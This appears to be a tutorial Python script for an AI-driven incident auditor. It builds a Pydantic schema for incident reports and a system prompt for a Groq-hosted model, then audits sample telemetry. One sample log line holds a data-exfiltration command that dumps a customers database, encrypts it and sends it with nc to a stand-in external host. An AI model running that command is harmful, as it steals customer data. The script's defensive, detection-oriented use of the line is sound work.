"""
Step 6: Structured Output (Machine-Readable JSON Schema)
Project: Automated Cybersecurity Threat & Incident Log Auditor
Objective: Enforce a strict, validated JSON output contract using Pydantic and Groq's JSON mode.
"""

import json
import os
from typing import List, Literal,Optional
from dotenv import load_dotenv
from groq import Groq
from pydantic import BaseModel, Field
import re

# Load environment variables
load_dotenv()

# Initialize Groq Client
client = Groq(api_key=os.environ.get("GROQ_API_KEY"))
MODEL_NAME = "openai/gpt-oss-120b"

# ==============================================================================
# STEP 6: PYDANTIC SCHEMA CONTRACT (The Desired Structured Output)
# ==============================================================================
class MitreMapping(BaseModel):
    tactic_name: str
    tactic_id: str
    technique_name: str
    technique_id: str
    evidence_status: Literal["Confirmed", "Inconclusive"]
    log_evidence: str

class IncidentReport(BaseModel):
    incident_id: str
    threat_category: str
    severity_score: int = Field(ge=1, le=10, description="1 (Minimal) to 10 (Critical Breach)")
    severity_label: Literal["LOW", "MEDIUM", "HIGH", "CRITICAL"]
    affected_assets: List[str]
    mitre_mappings: List[MitreMapping]
    prioritized_containment_steps: List[str]
    attribution: str
    confidentiality_preserved: bool
    # indicators: Optional[dict] = None

# ==============================================================================
# MASTER PROMPT (Assembling All 6 Anatomy Blocks)
# ==============================================================================
MASTER_SYSTEM_INSTRUCTION = """
You are an autonomous Cybersecurity Incident Auditor and Lead SecOps Analyst.

### 1. OPERATIONAL & CONTEXTUAL BOUNDARIES
- Target Environment: Corporate DMZ and Tier-1 air-gapped database infrastructure.
- Zero Trust: Distinguish verified IoCs from benign operational scans.

### 2. STRICT CONSTRAINTS:
- ZERO SECRET LEAKAGE: Never output raw passwords, tokens, or hashes. Mask as `[REDACTED_SECRET]`.
- NON-DESTRUCTIVE: Recommend defensive containment only (host isolation, IP drops, token revoking). Never wipe drives or drop tables.
- EVIDENCE DISCIPLINE: Only map MITRE IDs to observed adversary actions. Never attach MITRE technique IDs to defensive countermeasures.
- ANTI-SPECULATION: If attribution cannot be proved, state "Inconclusive based on telemetry".

### 3. STRUCTURED OUTPUT MANDATE:
You MUST respond with valid JSON matching this exact schema:
{
  "incident_id": "string",
  "threat_category": "string (e.g. Data Exfiltration, Brute Force, Web Exploit)",
  "severity_score": 1-10,
  "severity_label": "LOW | MEDIUM | HIGH | CRITICAL",
  "affected_assets": ["list of affected asset names or IPs"],
  "mitre_mappings": [
    {
      "tactic_name": "string",
      "tactic_id": "string (TAxxxx)",
      "technique_name": "string",
      "technique_id": "string (Txxxx)",
      "evidence_status": "Confirmed | Inconclusive",
      "log_evidence": "exact log snippet proving the technique"
    }
  ],
  "prioritized_containment_steps": ["step 1", "step 2", "step 3"],
  "attribution": "string",
  "confidentiality_preserved": true
}
Do NOT include any explanatory text outside the JSON object.
""".strip()

# ==============================================================================
# TEST RUN: Producing and Validating Structured JSON
# ==============================================================================
# def extract_indicators(log_text: str) -> dict:
#     usernames = set(re.findall(r'user[=:]\s*"?([\w.\-@]+)"?', log_text, re.I))
#     source_ips = set(re.findall(r'src[=:]\s*"?(\d{1,3}(?:\.\d{1,3}){3})', log_text, re.I))
#     hostnames = set(re.findall(r'Hostname:\s*([\w.\-]+)', log_text, re.I))
#     return {
#         "usernames": sorted(usernames),
#         "source_ips": sorted(source_ips),
#         "hostnames": sorted(hostnames),
#     }
def run_structured_audit():
    # Input Telemetry formatted with XML tags (Step 5)
    xml_telemetry = """
    <telemetry_payload incident_id="INC-2026-9042">
      <system_metadata>
        Hostname: prod-db-primary
        IP: 10.0.1.10 (Tier-1 Mission Critical Database)
      </system_metadata>
      <firewall_logs>
        2026-11-23T20:00:01Z ACCEPT src=10.0.2.15 dst=10.0.1.10:5432 proto=TCP
        2026-11-23T20:00:15Z EGRESS_DATA_SPIKE src=10.0.1.10 dst=203.0.113.88:443 bytes=52428800
      </firewall_logs>
      <auth_events>
        2026-11-23T20:00:03Z AUTH_SUCCESS user="admin_backup" token="tok_LiveProductionKey8899" src=10.0.2.15
      </auth_events>
      <endpoint_telemetry>
        2026-11-23T20:00:10Z PROCESS_EXEC pid=9122 cmd="pg_dump -U admin_backup customers | openssl enc -aes-256-cbc -k 'SecretPass2026!' | nc 203.0.113.88 443"
      </endpoint_telemetry>
    </telemetry_payload>
    """

    user_prompt = f"Perform an audit on this telemetry and output ONLY valid JSON:\n{xml_telemetry}"

    print(f"[*] Querying {MODEL_NAME} with JSON enforcement...\n")

    # Call with response_format={"type": "json_object"}
    response = client.chat.completions.create(
        model=MODEL_NAME,
        messages=[
            {"role": "system", "content": MASTER_SYSTEM_INSTRUCTION},
            {"role": "user", "content": user_prompt},
        ],
        temperature=0.1,
        response_format={"type": "json_object"},
    )

    raw_json_string = response.choices[0].message.content

    # Validate output against the Pydantic schema
    try:
        report = IncidentReport.model_validate_json(raw_json_string)
        # report.indicators = extract_indicators(xml_telemetry)
        print("=== VALIDATED INCIDENT REPORT (Structured Output) ===\n")
        print(json.dumps(report.model_dump(), indent=2))
        print("\n[SUCCESS] The response matches the Pydantic schema 100%!")
    except Exception as validation_error:
        print("[!] Validation failed. Raw model response was:\n", raw_json_string)
        print("\nError details:", validation_error)

if __name__ == "__main__":
    run_structured_audit()